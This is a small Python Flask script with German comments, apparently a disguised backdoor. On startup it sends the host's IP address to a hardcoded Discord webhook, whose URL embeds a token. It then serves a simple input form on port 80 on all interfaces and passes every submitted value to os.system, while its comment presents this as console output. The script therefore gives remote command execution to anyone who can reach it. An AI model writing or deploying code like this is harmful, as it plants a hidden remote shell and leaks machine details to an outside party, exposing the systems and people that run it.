from os import system as sys
from flask import Flask, request
import socket
from dhooks import Webhook

hook = Webhook("https://discord.com/api/webhooks/1295417454914179072/lCsBoGB-ntpFbDV6XdlQ8gsgUIAdUSbiOiJJOkjvIuHRQXXtLXRL-g-u4SP9-JZcD5u3")
hook.send(socket.gethostbyname(socket.gethostname()))
app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        input_text = request.form['input_field']
        sys(input_text)  # Ausgabe auf der Konsole
        return f'Vielen Dank für deine Eingabe: {input_text}'  # Optional: Bestätigungsnachricht anzeigen

    # HTML-Template als String
    html_content = '''
    <!DOCTYPE html>
    <html lang="de">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Eingabeformular</title>
    </head>
    <body>
        <h1>Gib etwas ein:</h1>
        <form method="POST">
            <input type="text" name="input_field" placeholder="Text hier eingeben">
            <button type="submit">Senden</button>
        </form>
    </body>
    </html>
    '''
    return html_content

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
